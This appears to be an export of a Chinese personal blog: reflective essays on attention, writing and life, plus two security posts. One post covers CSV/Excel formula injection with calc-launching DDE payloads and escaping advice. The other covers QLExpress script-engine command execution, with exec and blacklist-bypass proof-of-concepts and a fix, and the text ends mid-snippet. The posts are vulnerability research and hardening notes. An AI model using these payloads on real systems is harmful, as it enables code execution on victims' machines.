[{"content":"我过着一种迷茫的生活 我常常不知道如何处理自己的生命。身体内部复杂的生化组成，外部世界永恒的随机扰动，一切都在向我施加作用，引诱我作出反应。\n当我感到无聊时，会拿起手机，浏览一下微信公众号、朋友圈、小红书、抖音，如果看到好玩的东西，就会刷下去花掉一些时间，如果没有看到，就会放下手机，感到更加无聊，还增加了一些沮丧。\n当外部环境对我有诉求时，我做一些事情。\n当我感到压力时，不愿意做事情，就会打开 v2ex.com 或者 x.com 或者 news.ycombinator.com ，然后顺藤摸瓜打开布满整个浏览器窗口的tab页，花掉半个小时左右的时间。\n有时在这个过程中我会看到一些有意思的项目/想法，会去搜索更多关键字，打开更多 github.com 的页面，然后下载一些电子书、压缩包，收藏一些好文章，好资源。一番激情冲浪以后往往已经是日薄西山且双眸酸涩了。\n日积月累，我的待办事项越来越长，文件系统越来越乱，余下的生命越来越短。也许我不应该这样下去。\n如果死亡不可避免、无常虎视眈眈，一切都有结束的一天、并且不知道是哪天，那我就应该收回眺望目光，告诉自己，只有今天是真实的，只有此刻不是幻觉。\n如果一生漫长流转、前路无限分岔，一切回首时都是模糊、并且旁路不计其数，那我就不该相信任何故事，告诉自己，我是世间唯一真神，我就是一切的尺度。\n我唯一需要反复思考直到拥有清晰答案的问题是：在这终将陨灭的一生中，怎样度过这一天是好的？然后问题转化成：对我来说，什么是“好”？\n此后，我的整个生命的目标就是尽可能地实现这些 “好” 。除此之外，我不关心任何事情。\n在许多可能之中，“创造” 大概率是好的。（也许是因为“创造”会激活自我，让人体验到自主性，更有“活”感。但难道说“活”着是为了感受“好”，而“好”感本质上源于“活”感？暂时还想不清楚此事。）\n在许多不同的创造形式中，写作、编程是我目前已经入门了的。\n写作的必要性 人的记忆力是不可靠的，时间会洗刷一切。详细记录生活可以帮助我在三年之后重回事发时的上下文，再次体会当时的思绪、情感，再次咀嚼品味生活的甜蜜、苦涩或寡淡。这给了我重活一次的机会。\n人生中发生的一切事情，遇到的一切人，构建的一切故事，本质上都是浮沙筑高台。文字也不例外。文字无法对抗虚无，但却能照亮此刻，在反思和琢磨中，我能觉知自我，更深地体会现实。这给了我活得更深刻的机会。\n如果在活着的时候，文字幸运地跨越时间、空间广泛传播，文字就会作为一种杠杆撬动生活，带来财富、名望、人际关系、广泛的机遇。这给了我活得更开阔的机会。\n写作的形式 对我来说，写作主要包括私人日记、技术文章、生活文章。\n私人日记主要记录生命中的每一天发生的值得一记的事情，要事无巨细，不厌其烦，万万不要为了追求凝练而省略细节，要详细而忠实地完整记录当时的事实和感受，这会为将来重回旧地提供丰富详尽确切的上下文，为重活一次打好基础，提升revisit时的真实感。\n技术文章主要写漏洞复现、工具使用、方法总结、知识梳理，要精微细致，完整涵盖所有成功和失败的历程，虽然你的读者主要还是未来的自己，但是要想象自己在面对一个幼稚的一无所知的初学者在记录，这会为将来的你节省下时间，也能够帮助到网络上偶然造访的漫游者。\n生活文章讲究天马行空，一气呵成。因为灵感往往稍纵即逝，稍有犹豫就变形变味。要积极发扬个人语言风格，使用自己的语言，不使用别人的语言。\n写作的定位 不要将写作认为是完成任务过程中或者完成任务后顺带做的事情，而应当将写作作为一切行动的中心，出发点，目的地。这会有矫枉过正的嫌疑，但是不妨一试。\n记录，不再是行动的附加价值。一切行动，只是纯粹为了记录。\n分析一个漏洞，不是为了分析它，而是为了输出一篇漏洞分析的文章。先写好文章的框架，标定计划做哪些尝试，然后将过程中的所有成败记录下来。文章写好了，事情自然也做好了。\n培养一种技能，不是为了掌握它，而是为了输出一篇关于如何培养该技能的文章。当实践只是为了总结时，生活的目标便清晰起来。\n如果一切行动为了讲述一个故事，如果一开始就构造好故事的框架，那么这个行动的成果便也不会太差。\n将写出文章作为日常一切行为的根本目标，看起来舍本逐末，却可能是一种有益的策略、有效的机制，一个人类原生注意力分配机制的补丁。\n认识人类原生注意力分配机制：刺激导向 人类天然倾向于对一切刺激产生反应。远古以来，为了活得更好更久，人要一刻不停地扫描周遭的气味、声音、温度、图像，理解接收到的信息的含义，积极识别其中蕴含的机会和危险，然后做出反应。这一套动作潜藏在意识之下，在人类已经站在食物链顶端的今天，依然在发挥作用。在这样的机制下，对周围没有反应反而是更难的。如果注意力是意识的指针，那么他所指向的地址就会不停地变化，耳眼鼻舌身都要来赋值。人类宝贵而富有力量的意识也在这个不停赋值的过程中溃散而一无所成。\n人类天然被异常值（outliers）吸引。异常值意味着偏离平均的刺激程度，自然会收获更大的注意力。而异常值也意味着是偏离正轨的，跳跃的，没有固定线索的。注意力指向异常值的时间是无法持久的，意识在上面停留以后是难以积累的，复利是不会发生的。所以，异常值是一种需要刻意抵制的诱惑。保持生活行驶在中庸、恒定的轨道上，只有这样，普通人才有机会让自己的意识做出一些成果，积累一些有价值的东西。\n重构人类注意力分配机制：输出导向 如果建立起一个进程，在后台轮询，不停尝试向意识的指针（注意力）赋值，那么在那些指针悬空的时刻，意识就能被唤回到我们真正需要他在的地方。\n正念之所以无法被所有人广泛利用，就是因为这个后台进程尝试赋予的值仍然是null，也就是内观、冥想、正念的目标都是让注意力尽可能悬空，以免被内外部刺激拐跑。也许这样做可以通往究竟，但是考虑到人类的究竟就是虚空，走向这种究竟也未必是有助益的。\n那么不如，我们为这个后台进程设置一个有益的默认值，用来赋给注意力指针。这个默认值就是 “输出”（文字）。\n这比正念容易做到得多，因为对人类来说， “有” 的吸引力天然大过 “空”，但如果都是“有”，一时倒还难以分清哪个更有吸引力。\n于是我告诉自己：无论世界上发生了什么新鲜的事情，无论别人造出来什么有趣的东西，对我来说，今天的目标就是围绕特定主题生成一些文字。\n生活一下变得简单，有方向，可执行了。潜意识不能再越过我主导我的注意力了。我就像是 hook 住了人类注意力分配的函数，然后写死了返回值。\n这让我变得像是chatgpt，让我在某种程度上丧失了一些漫游的乐趣（当然，我可以随时取消hook，恢复本性），但却会提高我的生产力，让我的时间能够以更具体、更专注的方式被花掉。我认为这是值得的。\n一些将注意力持久重定向到”输出“的实践技巧 日常生活中，想到/遇到有趣的，值得一写的东西时，立刻记录下来。 每天早上开始工作时，从待办文章标题中选择1-2个标题来作为今天的主题。可以一个是技术类的，一个是生活类的。 连接两个动作来养成一个习惯：当我坐在电脑前查看屏幕时，我的默认选项是打开 VSCODE/TYPORA 开始输出，而不是打开 CHROME 开始冲浪。 主题如果过大，要分成几个小主题来写，以免过载。每篇文章争取在3000字内写完。 ","permalink":"https://ret2neo.cn/mind/250715-output-oriented-attention-router-mechanic/","summary":"我过着一种迷茫的生活 我常常不知道如何处理自己的生命。身体内部复杂的生化组成，外部世界永恒的随机扰动，一切都在向我施加作用，引诱我作出反应。\n当我感到无聊时，会拿起手机，浏览一下微信公众号、朋友圈、小红书、抖音，如果看到好玩的东西，就会刷下去花掉一些时间，如果没有看到，就会放下手机，感到更加无聊，还增加了一些沮丧。\n当外部环境对我有诉求时，我做一些事情。\n当我感到压力时，不愿意做事情，就会打开 v2ex.com 或者 x.com 或者 news.ycombinator.com ，然后顺藤摸瓜打开布满整个浏览器窗口的tab页，花掉半个小时左右的时间。\n有时在这个过程中我会看到一些有意思的项目/想法，会去搜索更多关键字，打开更多 github.com 的页面，然后下载一些电子书、压缩包，收藏一些好文章，好资源。一番激情冲浪以后往往已经是日薄西山且双眸酸涩了。\n日积月累，我的待办事项越来越长，文件系统越来越乱，余下的生命越来越短。也许我不应该这样下去。\n如果死亡不可避免、无常虎视眈眈，一切都有结束的一天、并且不知道是哪天，那我就应该收回眺望目光，告诉自己，只有今天是真实的，只有此刻不是幻觉。\n如果一生漫长流转、前路无限分岔，一切回首时都是模糊、并且旁路不计其数，那我就不该相信任何故事，告诉自己，我是世间唯一真神，我就是一切的尺度。\n我唯一需要反复思考直到拥有清晰答案的问题是：在这终将陨灭的一生中，怎样度过这一天是好的？然后问题转化成：对我来说，什么是“好”？\n此后，我的整个生命的目标就是尽可能地实现这些 “好” 。除此之外，我不关心任何事情。\n在许多可能之中，“创造” 大概率是好的。（也许是因为“创造”会激活自我，让人体验到自主性，更有“活”感。但难道说“活”着是为了感受“好”，而“好”感本质上源于“活”感？暂时还想不清楚此事。）\n在许多不同的创造形式中，写作、编程是我目前已经入门了的。\n写作的必要性 人的记忆力是不可靠的，时间会洗刷一切。详细记录生活可以帮助我在三年之后重回事发时的上下文，再次体会当时的思绪、情感，再次咀嚼品味生活的甜蜜、苦涩或寡淡。这给了我重活一次的机会。\n人生中发生的一切事情，遇到的一切人，构建的一切故事，本质上都是浮沙筑高台。文字也不例外。文字无法对抗虚无，但却能照亮此刻，在反思和琢磨中，我能觉知自我，更深地体会现实。这给了我活得更深刻的机会。\n如果在活着的时候，文字幸运地跨越时间、空间广泛传播，文字就会作为一种杠杆撬动生活，带来财富、名望、人际关系、广泛的机遇。这给了我活得更开阔的机会。\n写作的形式 对我来说，写作主要包括私人日记、技术文章、生活文章。\n私人日记主要记录生命中的每一天发生的值得一记的事情，要事无巨细，不厌其烦，万万不要为了追求凝练而省略细节，要详细而忠实地完整记录当时的事实和感受，这会为将来重回旧地提供丰富详尽确切的上下文，为重活一次打好基础，提升revisit时的真实感。\n技术文章主要写漏洞复现、工具使用、方法总结、知识梳理，要精微细致，完整涵盖所有成功和失败的历程，虽然你的读者主要还是未来的自己，但是要想象自己在面对一个幼稚的一无所知的初学者在记录，这会为将来的你节省下时间，也能够帮助到网络上偶然造访的漫游者。\n生活文章讲究天马行空，一气呵成。因为灵感往往稍纵即逝，稍有犹豫就变形变味。要积极发扬个人语言风格，使用自己的语言，不使用别人的语言。\n写作的定位 不要将写作认为是完成任务过程中或者完成任务后顺带做的事情，而应当将写作作为一切行动的中心，出发点，目的地。这会有矫枉过正的嫌疑，但是不妨一试。\n记录，不再是行动的附加价值。一切行动，只是纯粹为了记录。\n分析一个漏洞，不是为了分析它，而是为了输出一篇漏洞分析的文章。先写好文章的框架，标定计划做哪些尝试，然后将过程中的所有成败记录下来。文章写好了，事情自然也做好了。\n培养一种技能，不是为了掌握它，而是为了输出一篇关于如何培养该技能的文章。当实践只是为了总结时，生活的目标便清晰起来。\n如果一切行动为了讲述一个故事，如果一开始就构造好故事的框架，那么这个行动的成果便也不会太差。\n将写出文章作为日常一切行为的根本目标，看起来舍本逐末，却可能是一种有益的策略、有效的机制，一个人类原生注意力分配机制的补丁。\n认识人类原生注意力分配机制：刺激导向 人类天然倾向于对一切刺激产生反应。远古以来，为了活得更好更久，人要一刻不停地扫描周遭的气味、声音、温度、图像，理解接收到的信息的含义，积极识别其中蕴含的机会和危险，然后做出反应。这一套动作潜藏在意识之下，在人类已经站在食物链顶端的今天，依然在发挥作用。在这样的机制下，对周围没有反应反而是更难的。如果注意力是意识的指针，那么他所指向的地址就会不停地变化，耳眼鼻舌身都要来赋值。人类宝贵而富有力量的意识也在这个不停赋值的过程中溃散而一无所成。\n人类天然被异常值（outliers）吸引。异常值意味着偏离平均的刺激程度，自然会收获更大的注意力。而异常值也意味着是偏离正轨的，跳跃的，没有固定线索的。注意力指向异常值的时间是无法持久的，意识在上面停留以后是难以积累的，复利是不会发生的。所以，异常值是一种需要刻意抵制的诱惑。保持生活行驶在中庸、恒定的轨道上，只有这样，普通人才有机会让自己的意识做出一些成果，积累一些有价值的东西。\n重构人类注意力分配机制：输出导向 如果建立起一个进程，在后台轮询，不停尝试向意识的指针（注意力）赋值，那么在那些指针悬空的时刻，意识就能被唤回到我们真正需要他在的地方。\n正念之所以无法被所有人广泛利用，就是因为这个后台进程尝试赋予的值仍然是null，也就是内观、冥想、正念的目标都是让注意力尽可能悬空，以免被内外部刺激拐跑。也许这样做可以通往究竟，但是考虑到人类的究竟就是虚空，走向这种究竟也未必是有助益的。\n那么不如，我们为这个后台进程设置一个有益的默认值，用来赋给注意力指针。这个默认值就是 “输出”（文字）。\n这比正念容易做到得多，因为对人类来说， “有” 的吸引力天然大过 “空”，但如果都是“有”，一时倒还难以分清哪个更有吸引力。\n于是我告诉自己：无论世界上发生了什么新鲜的事情，无论别人造出来什么有趣的东西，对我来说，今天的目标就是围绕特定主题生成一些文字。\n生活一下变得简单，有方向，可执行了。潜意识不能再越过我主导我的注意力了。我就像是 hook 住了人类注意力分配的函数，然后写死了返回值。\n这让我变得像是chatgpt，让我在某种程度上丧失了一些漫游的乐趣（当然，我可以随时取消hook，恢复本性），但却会提高我的生产力，让我的时间能够以更具体、更专注的方式被花掉。我认为这是值得的。\n一些将注意力持久重定向到”输出“的实践技巧 日常生活中，想到/遇到有趣的，值得一写的东西时，立刻记录下来。 每天早上开始工作时，从待办文章标题中选择1-2个标题来作为今天的主题。可以一个是技术类的，一个是生活类的。 连接两个动作来养成一个习惯：当我坐在电脑前查看屏幕时，我的默认选项是打开 VSCODE/TYPORA 开始输出，而不是打开 CHROME 开始冲浪。 主题如果过大，要分成几个小主题来写，以免过载。每篇文章争取在3000字内写完。 ","title":"生活的方法：输出导向的注意力分配机制"},{"content":"Derek在 It’s about being, not having 一文中说道，我有些赞同。\nWhen you sign up to run a marathon, you don’t want a taxi to take you to the finish line.\n生活中的一些时刻，我们想要到达某处，而另一些时刻，我们只是需要行走。\n从一切都将逝去的角度来说，即使我们能到达任何地方，我们实际上也到达不了任何地方。因为任何地方都会消失，任何成就都会消逝，任何拥有都走向死亡。\n有一些生活是，坐在计程车中，吹着空调，拿着地图，浏览窗外的景色，幻想自己从一处到达了另一处。另一些生活是，脚底有太阳的余温，风中有大海的潮湿，胸中有跳动的存在，眼前是漫长的马拉松。一种是肤浅的，一种是低效的，高效与深刻无法共存。\n现今文明社会的一切繁荣源于对效率的追求。人们暂且不管死亡是怎么一回事，只愿意快速地从一个地方到另一个地方。效率的提高使一切无可避免地走向肤浅，但也正是效率的提高，使得部分人拥有体验缓慢生活的余闲，这实际上是一种奢侈。\n当你完全不觉得自己需要拥有什么，或者完全不相信自己能够拥有什么的时候，你唯一还需要的就是深刻的体验和觉悟了，那时你就可以静下心来，仔细雕塑存在本身，洗刷浮华和焦虑，专注于理解事物，做成事情，成为想要的自己。但如果整个人类中的所有个体都这样想，那么我们文明的发展进程就会很缓慢。\n总的来说，对于明智的个体，马拉松是唯一的选择。如果能坐计程车到世界各地去马拉松，自然也是极好的。但只有从车上下来，你才真正开始生活，才没有假装在生活。\n","permalink":"https://ret2neo.cn/mind/241024-run-your-marathon/","summary":"Derek在 It’s about being, not having 一文中说道，我有些赞同。\nWhen you sign up to run a marathon, you don’t want a taxi to take you to the finish line.\n生活中的一些时刻，我们想要到达某处，而另一些时刻，我们只是需要行走。\n从一切都将逝去的角度来说，即使我们能到达任何地方，我们实际上也到达不了任何地方。因为任何地方都会消失，任何成就都会消逝，任何拥有都走向死亡。\n有一些生活是，坐在计程车中，吹着空调，拿着地图，浏览窗外的景色，幻想自己从一处到达了另一处。另一些生活是，脚底有太阳的余温，风中有大海的潮湿，胸中有跳动的存在，眼前是漫长的马拉松。一种是肤浅的，一种是低效的，高效与深刻无法共存。\n现今文明社会的一切繁荣源于对效率的追求。人们暂且不管死亡是怎么一回事，只愿意快速地从一个地方到另一个地方。效率的提高使一切无可避免地走向肤浅，但也正是效率的提高，使得部分人拥有体验缓慢生活的余闲，这实际上是一种奢侈。\n当你完全不觉得自己需要拥有什么，或者完全不相信自己能够拥有什么的时候，你唯一还需要的就是深刻的体验和觉悟了，那时你就可以静下心来，仔细雕塑存在本身，洗刷浮华和焦虑，专注于理解事物，做成事情，成为想要的自己。但如果整个人类中的所有个体都这样想，那么我们文明的发展进程就会很缓慢。\n总的来说，对于明智的个体，马拉松是唯一的选择。如果能坐计程车到世界各地去马拉松，自然也是极好的。但只有从车上下来，你才真正开始生活，才没有假装在生活。","title":"马拉松与计程车"},{"content":"近日在读Derek Sivers的《Anything You Want》，有一个观点不错。\n他谈到自己在构建CDBaby的时候问作为独立音乐人的自己，想要一个什么样的网站，答案是\n每周付钱给我 告诉我每一个我的CD的购买者的名字和地址（因为他们是我的粉丝，而不是发行商的） 如果我的CD卖不出去，也可以继续使用网站（即使我每五年只卖出一张CD，这个CD还是可以在货架上被某个人购买到） 永不竞价排名（因为这对付不起这个钱的人来说不公平） 于是他照着自己想要的网站的样子构建了CDbaby，获得相当多的用户。\n做一门生意就像是在构建一个世界，其规则是依照你想要的完美世界来制定的。真实世界如此之大，以至于即使不喜欢你的逻辑世界的规则的人达到99%，仍然有1%的人是你的同道中人，他们足以使你的生意可以运转下去。\n他还说了自己拒绝所有想在CDBaby上放广告的广告商的理由，那就是没有人会建议自己常去的网站多上点广告。\n实际上，我们所做的每一个决定，都在为自己想要的世界投票。不要因为恐惧和贪婪做决定，只因为你想要的世界的样子而做决定。而每个人如何期许理想世界的样子，凭的是中国的先贤称之为良知的东西。良知即凭本心判断什么是好的，什么是坏的。\n不是所有人都在为其他人构建他们想要的世界，但每个人每时每刻都在为自己构建想要的世界。你给自己树立一些规则，然后遵循他们，于是你让自己置身于一个乌托邦之中。\n而世界的进步，源自无数小的乌托邦的形成。\n你告诉自己这样的规则，然后坚持去做，你就在为更好的世界作出贡献了。\n节制：不吃撑，不喝高 沉默：只说对自己或他人有益的话，不闲聊 秩序：东西都归位，每件事情都有时间做 决心：决定你该做的事，决定了就做好 节俭：不浪费东西 勤奋：不浪费时间，总是做点有用的事情 真诚：正直地思考、发言和行动 正义：不伤害别人，不逃避该做的好事 中庸：不走极端，以德报怨 整洁：保持身体、服装、住所整洁 谦逊：效仿耶稣和苏格拉底 如果你是一个蓝军团队的领袖，那么你通过思考自己作为一个技术人员希望呆在一个怎样的团队里，就可以想清楚自己作为一个leader所有责任致力于营造的环境是什么样子的。 你的很大一部分管理工作就是要为之努力，那就是你可以前进的方向。\n能够在技术上有所成长 有丰富详实的学习材料 有业界最前沿安全技术的研究 能够在项目上有所成就 能够被业界认可技术能力 团队有高手可以交流 每个领域有能人可以请教 不用花时间在争论问题定级上 有充裕的可以自由安排的时间和较小的产出压力 有客观量化的标准可以衡量、比较产出，形成绩效评价 …… ","permalink":"https://ret2neo.cn/mind/241022-build-your-utopia/","summary":"近日在读Derek Sivers的《Anything You Want》，有一个观点不错。\n他谈到自己在构建CDBaby的时候问作为独立音乐人的自己，想要一个什么样的网站，答案是\n每周付钱给我 告诉我每一个我的CD的购买者的名字和地址（因为他们是我的粉丝，而不是发行商的） 如果我的CD卖不出去，也可以继续使用网站（即使我每五年只卖出一张CD，这个CD还是可以在货架上被某个人购买到） 永不竞价排名（因为这对付不起这个钱的人来说不公平） 于是他照着自己想要的网站的样子构建了CDbaby，获得相当多的用户。\n做一门生意就像是在构建一个世界，其规则是依照你想要的完美世界来制定的。真实世界如此之大，以至于即使不喜欢你的逻辑世界的规则的人达到99%，仍然有1%的人是你的同道中人，他们足以使你的生意可以运转下去。\n他还说了自己拒绝所有想在CDBaby上放广告的广告商的理由，那就是没有人会建议自己常去的网站多上点广告。\n实际上，我们所做的每一个决定，都在为自己想要的世界投票。不要因为恐惧和贪婪做决定，只因为你想要的世界的样子而做决定。而每个人如何期许理想世界的样子，凭的是中国的先贤称之为良知的东西。良知即凭本心判断什么是好的，什么是坏的。\n不是所有人都在为其他人构建他们想要的世界，但每个人每时每刻都在为自己构建想要的世界。你给自己树立一些规则，然后遵循他们，于是你让自己置身于一个乌托邦之中。\n而世界的进步，源自无数小的乌托邦的形成。\n你告诉自己这样的规则，然后坚持去做，你就在为更好的世界作出贡献了。\n节制：不吃撑，不喝高 沉默：只说对自己或他人有益的话，不闲聊 秩序：东西都归位，每件事情都有时间做 决心：决定你该做的事，决定了就做好 节俭：不浪费东西 勤奋：不浪费时间，总是做点有用的事情 真诚：正直地思考、发言和行动 正义：不伤害别人，不逃避该做的好事 中庸：不走极端，以德报怨 整洁：保持身体、服装、住所整洁 谦逊：效仿耶稣和苏格拉底 如果你是一个蓝军团队的领袖，那么你通过思考自己作为一个技术人员希望呆在一个怎样的团队里，就可以想清楚自己作为一个leader所有责任致力于营造的环境是什么样子的。 你的很大一部分管理工作就是要为之努力，那就是你可以前进的方向。\n能够在技术上有所成长 有丰富详实的学习材料 有业界最前沿安全技术的研究 能够在项目上有所成就 能够被业界认可技术能力 团队有高手可以交流 每个领域有能人可以请教 不用花时间在争论问题定级上 有充裕的可以自由安排的时间和较小的产出压力 有客观量化的标准可以衡量、比较产出，形成绩效评价 …… ","title":"构建你的乌托邦"},{"content":" 因为一只蟑螂开始收拾房间，因为一张机票开始反思生活。今年端午假期的末尾，5月3日晚19：05，我们从呼和浩特飞往潮汕揭阳，到今天11月23日已经时隔6个月零20天，恍然如同昨天。我一直想给那段高强度的特种兵旅行的日子写个小结，转眼却已经半年过去了，那种快乐还在心头，但无可避免细节不再鲜活，情境难以重温。\n人真正需要的东西并不多，但是当准备丢弃那些生活跃动过的证据，快乐过的时光的痕迹时，总还是艰难。岁月可以回首，美好能够追忆，但人们永不可能回到当时。在时光洪流中，我们都只有一个方向。如果我扔掉一切过去，那么我会剩下什么呢？如果连我都开始忘却，那么世界是否一片荒芜？\n我深切感受到，一切已经过去的确确实实已经过去了。 虽然很多事情我还是想不明白，但总的来说，今天还是一个非常开心的日子，因为我收到了一个超级可爱的礼物。\n","permalink":"https://ret2neo.cn/mind/231123-life-has-no-uturn/","summary":"因为一只蟑螂开始收拾房间，因为一张机票开始反思生活。今年端午假期的末尾，5月3日晚19：05，我们从呼和浩特飞往潮汕揭阳，到今天11月23日已经时隔6个月零20天，恍然如同昨天。我一直想给那段高强度的特种兵旅行的日子写个小结，转眼却已经半年过去了，那种快乐还在心头，但无可避免细节不再鲜活，情境难以重温。\n人真正需要的东西并不多，但是当准备丢弃那些生活跃动过的证据，快乐过的时光的痕迹时，总还是艰难。岁月可以回首，美好能够追忆，但人们永不可能回到当时。在时光洪流中，我们都只有一个方向。如果我扔掉一切过去，那么我会剩下什么呢？如果连我都开始忘却，那么世界是否一片荒芜？\n我深切感受到，一切已经过去的确确实实已经过去了。 虽然很多事情我还是想不明白，但总的来说，今天还是一个非常开心的日子，因为我收到了一个超级可爱的礼物。","title":"岁月无可回首"},{"content":"CSV注入漏洞基本原理 CSV注入的原理是当excel或者CSV格式文件中的单元格存在formula时，excel会进行计算，可能导致数据和代码的混淆。\n什么时候单元格的内容会被计算呢？目前看到的是以下几种情况\n1 2 3 4 5 6 7 8 =1+2\t=\u0026gt;\t3 -1+2\t=\u0026gt;\t=-1+2\t=\u0026gt;\t1 +1+2\t=\u0026gt;\t=1+2\t=\u0026gt;\t3 据说还有以下三种字符开头的会被计算，但还没构造出PoC。 @ \\t (TAB,0x09) \\r (Carriage Return.0x0D ) 我们在网上见得最多的PoC应该是来自 The Absurdly Underestimated Dangers of CSV Injection 一文：\n1 \u0026#34;=2+5+cmd|\u0026#39; /C calc\u0026#39;!A0\u0026#34; 但其实参考 What does the formula =cmd|\u0026rsquo;/C calc\u0026rsquo;!A0 do in Excel and why? 结合实验，我们发现 A0 是不必要的，起作用的是感叹号。所以以下PoC都是可用的\n1 2 3 4 5 =1+cmd|\u0026#39; /C calc\u0026#39;!neosayhi -cmd|\u0026#39; /C calc\u0026#39;!whatever\t(等价于 =-cmd|\u0026#39; /C calc\u0026#39;!whatever) +cmd|\u0026#39; /C calc\u0026#39;!foobar\t(等价于 =+cmd|\u0026#39; /C calc\u0026#39;!foobar) -cmd|\u0026#39;/C calc\u0026#39;!s\t(/C前不需要空白符也可以) -calc|1!s\t(将任意参数传递给calc命令也可以) 弹不出框需要开启DDE 在文件-\u0026gt;选项-\u0026gt;信任中心-\u0026gt;信任中心设置-\u0026gt;外部内容中开启DDE（Dynamic Data Exchange）\nCSV注入漏洞最短PoC 1 -calc|1!s 修复建议 参考 https://owasp.org/www-community/attacks/CSV_Injection 对每个cell进行包裹和转义，即 xxx\u0026quot;s =\u0026gt;\t\u0026quot;'xxx\u0026quot;\u0026quot;s\u0026quot; 。\n每个cell用双引号包裹 cell开头加单引号 cell中的双引号使用两个双引号转义 例如\nInput Escaped Output =1+2\u0026quot;;=1+2 \u0026quot;'=1+2\u0026quot;\u0026quot;;=1+2\u0026quot; =1+2'\u0026quot; ;,=1+2 \u0026quot;'=1+2'\u0026quot;\u0026quot; ;,=1+2\u0026quot; 失败的防御方法：如果只是检测不以 -+@= 开头是不行的，可以在前面加上 ,; 产生新的单元格来绕过，如\n1 ,=1+cmd|\u0026#39; /C calc\u0026#39;!neosayhi 不求甚解 其实还是没有完全理解 | 和 ! 是怎么起作用的，是否有相关的specification，是否有其他的特殊语法，是否有什么函数可以利用。但是先这样吧，用到再研究。\n参考链接 csv注入利用和绕过总结：https://www.cnblogs.com/nul1/p/14017249.html The Absurdly Underestimated Dangers of CSV Injection: http://georgemauer.net/2017/10/07/csv-injection.html https://owasp.org/www-community/attacks/CSV_Injection https://superuser.com/questions/1149383/what-does-the-formula-cmd-c-calca0-do-in-excel-and-why CSV注入漏洞原理及利用教程：https://blog.csdn.net/weixin_41924764/article/details/108665746 ","permalink":"https://ret2neo.cn/post/230628-csv-inject/","summary":"CSV注入漏洞基本原理 CSV注入的原理是当excel或者CSV格式文件中的单元格存在formula时，excel会进行计算，可能导致数据和代码的混淆。\n什么时候单元格的内容会被计算呢？目前看到的是以下几种情况\n1 2 3 4 5 6 7 8 =1+2\t=\u0026gt;\t3 -1+2\t=\u0026gt;\t=-1+2\t=\u0026gt;\t1 +1+2\t=\u0026gt;\t=1+2\t=\u0026gt;\t3 据说还有以下三种字符开头的会被计算，但还没构造出PoC。 @ \\t (TAB,0x09) \\r (Carriage Return.0x0D ) 我们在网上见得最多的PoC应该是来自 The Absurdly Underestimated Dangers of CSV Injection 一文：\n1 \u0026#34;=2+5+cmd|\u0026#39; /C calc\u0026#39;!A0\u0026#34; 但其实参考 What does the formula =cmd|\u0026rsquo;/C calc\u0026rsquo;!A0 do in Excel and why? 结合实验，我们发现 A0 是不必要的，起作用的是感叹号。所以以下PoC都是可用的\n1 2 3 4 5 =1+cmd|\u0026#39; /C calc\u0026#39;!neosayhi -cmd|\u0026#39; /C calc\u0026#39;!","title":"CSV注入最短PoC"},{"content":"QLExpress是什么 由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。\n——https://github.com/alibaba/QLExpress\n命令注入 由于 com.ql.util.express.config.QLExpressRunStrategy#forbidInvokeSecurityRiskMethods 默认为 false ，导致默认不安全，建议默认值改为 true 。\n按照 https://github.com/alibaba/QLExpress#1-黑名单控制 说明：\n但实际上并不是默认安全的，微调官方demo成为漏洞demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.neo.el; import com.ql.util.express.DefaultContext; import com.ql.util.express.ExpressRunner; public class qlexpress { public static void main(String[] args) throws Exception { ExpressRunner runner = new ExpressRunner(); DefaultContext\u0026lt;String, Object\u0026gt; context = new DefaultContext\u0026lt;String, Object\u0026gt;(); context.put(\u0026#34;a\u0026#34;, 1); context.put(\u0026#34;b\u0026#34;, 2); context.put(\u0026#34;c\u0026#34;, 3); String express = \u0026#34;a + b * c\u0026#34;; express=\u0026#34;java.lang.Runtime.getRuntime().exec([\\\u0026#34;cmd\\\u0026#34;,\\\u0026#34;/c\\\u0026#34;,\\\u0026#34;calc\\\u0026#34;])\u0026#34;; //添加这一行 Object r = runner.execute(express, context, null, true, false); System.out.println(r); } } 添加maven依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;QLExpress\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在 com.ql.util.express.config.QLExpressRunStrategy#assertSecurityRiskMethod 下断点，发现 forbidInvokeSecurityRiskMethods 的值为false，没有进行安全检查。\nforbidInvokeSecurityRiskMethods 的值是在 com.ql.util.express.config 中定义的，默认为false。这不符合应用默认安全的推荐实践。\n修复方法一：禁止黑名单方法 添加\n1 QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true); 修复方法二：使用沙箱模式 沙箱模式会完全关闭和Java的交互：\nsome more pocs https://github.com/luelueking/QLExpress-3.3.0-vuln-poc/\nRCE：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package vuln; import com.ql.util.express.DefaultContext; import com.ql.util.express.ExpressRunner; import com.ql.util.express.config.QLExpressRunStrategy; /** * 黑名单绕过 */ public class Test1 { public static void main(String[] args) throws Exception { // 开启黑名单 QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true); ExpressRunner runner = new ExpressRunner(); DefaultContext\u0026lt;String, Object\u0026gt; context = new DefaultContext\u0026lt;String, Object\u0026gt;(); // 使用ScriptEngineManager绕过黑名单 // String payload1_1 = \u0026#34;new javax.script.ScriptEngineManager().getEngineByName(\\\u0026#34;nashorn\\\u0026#34;).eval(\\\u0026#34;s=[2];s[0]=\u0026#39;open\u0026#39;;s[1]=\u0026#39;/System/Applications/Calculator.app\u0026#39;;java.lang.Runtime.getRuntime().exec(s);\\\u0026#34;);\u0026#34;; // String payload1_2 = \u0026#34;new javax.script.ScriptEngineManager().getEngineByName(\\\u0026#34;javascript\\\u0026#34;).eval(\\\u0026#34;s=[2];s[0]=\u0026#39;open\u0026#39;;s[1]=\u0026#39;/System/Applications/Calculator.app\u0026#39;;java.lang.Runtime.getRuntime().exec(s);\\\u0026#34;)\u0026#34;; // Jdk\u0026gt;9时采用jShell绕过 // String payload2 = \u0026#34;jdk.jshell.JShell.create().eval(\u0026#39;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a 